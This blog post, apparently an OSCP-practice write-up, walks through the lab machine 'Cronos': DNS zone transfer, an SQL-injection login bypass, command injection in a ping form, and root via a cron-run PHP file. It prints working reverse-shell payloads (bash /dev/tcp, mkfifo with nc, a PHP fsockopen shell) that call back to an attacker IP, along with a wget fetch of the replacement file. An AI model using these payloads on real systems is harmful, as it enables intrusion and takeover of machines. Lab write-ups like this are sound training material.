---
layout: post
title: "cronOS"
date: 2025-09-06 
categories: OSCP Playlist
---
# cronOS

## Summary:

- DNS reverse lookup to find domain name
- DNS zone transfer to find subdomains
- SQLi to login to admin portal
- command injection vulnerability lead to reverse shell
- systemwide crontab show root executing php script
- modify script to get root reverse shell

First, let’s enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/cronos 10.10.10.13

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3 open ports. Let’s try reverse look up to get the domain name:

```bash
dig @10.10.10.13 -x 10.10.10.13

; <<>> DiG 9.20.9-1-Debian <<>> @10.10.10.13 -x 10.10.10.13
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8871
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;13.10.10.10.in-addr.arpa.      IN      PTR

;; ANSWER SECTION:
13.10.10.10.in-addr.arpa. 604800 IN     PTR     ns1.cronos.htb.

;; AUTHORITY SECTION:
10.10.10.in-addr.arpa.  604800  IN      NS      ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 20 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (UDP)
;; WHEN: Sat Sep 06 09:01:35 BST 2025
;; MSG SIZE  rcvd: 111

```

We got a name server. Let’s add that to our /etc/hosts:

```bash
10.10.10.13 ns1.cronos.htb cronos.htb
```

Let’s attempt a zone transfer:

```bash
dig axfr cronos.htb @10.10.10.13

cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
```

We got 2 additional sites, let’s add those to /etc/hosts as well.

```bash
admin.cronos.htb www.cronos.htb
```

Now let’s visit the web page.

## cronos.htb

![image.png]({{ site.baseurl }}/assets/cronos/image.png)

We click on documentation and we get redirected to a documentation of Laravel. Maybe the site is using this:

![image.png]({{ site.baseurl }}/assets/cronos/image%201.png)

And the github link takes us to the github repo for Laravel. Let’s see if the structure is the same and we can find the version employed in Cronos. There is a [README.md](http://README.md) and CHANGELOG.md.

```bash
http://cronos.htb/README.md
http://cronos.htb/CHANGELOG.md
```

Nothing.

## admin.cronos.htb

![image.png]({{ site.baseurl }}/assets/cronos/image%202.png)

A login page. Default credentials admin:admin did not work. Let’s try simple SQLi:

```bash
' OR '1'='1'-- -
```

![image.png]({{ site.baseurl }}/assets/cronos/image%203.png)

We are in.

We have the option to traceroute and ping:

![image.png]({{ site.baseurl }}/assets/cronos/image%204.png)

![image.png]({{ site.baseurl }}/assets/cronos/image%205.png)

Seems like it’s executing a command on the backend. Checking the request on Burp, we see the command:

```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=fq5nuiso7qt4he68j84bgepj01
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=ping+-c+1&host=8.8.8.8
```

Maybe we have command injection. Let’s try some commands to make sure:

```bash
command=sleep&host=3

#Response
#The server took around 3 seconds to respond.
```

```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=fq5nuiso7qt4he68j84bgepj01
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=nc+10.10.16.7&host=80
```

![image.png]({{ site.baseurl }}/assets/cronos/image%206.png)

We get a connection back. Let’s get a reverse shell. 

```bash
bash -c 'bash -i &> /dev/tcp/10.10.16.7/4444 2>&1'
```

Now after URL encoding:

```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=fq5nuiso7qt4he68j84bgepj01
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.16.7/4444+2>%261'
```

We got a connection, but it automatically exited:

![image.png]({{ site.baseurl }}/assets/cronos/image%207.png)

We basically have a web shell. We cannot just put an ssh key in the homedir as the www-data user does not have a home dir. 

Maybe there is a cronjob logging us off. Let’s try sh instead:

```bash
command=bash+-c+'sh+-i+%26>+/dev/tcp/10.10.16.7/4444+2>%261'

OR

command=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444>/tmp/f
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/cronos/image%208.png)

Let’s check cron jobs:

```bash
ls -la /etc/cron*

total 24
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php

```

mdadm looks unusual. Let’s check.

Nothing. Check the system wide crontab:

```bash
cat /etc/crontab

* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

We find root is executing php file /var/www/laravel/artisan periodically. Let’s overwrite it with a  php reverse shelland see what happens:

```bash
<?php
$sock=fsockopen("10.10.16.7",9001);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

```

Let’s write that on our attack host, call it artisan and transfer it over:

```bash
rm artisan
wget http://10.10.16.7:8001/artisan
chmod +x artisan

#on attack host
nc -nlvp 9001
```

We now have root shell:

![image.png]({{ site.baseurl }}/assets/cronos/image%209.png)

If we want a better shell, we can search pentest monkey php reverse shell.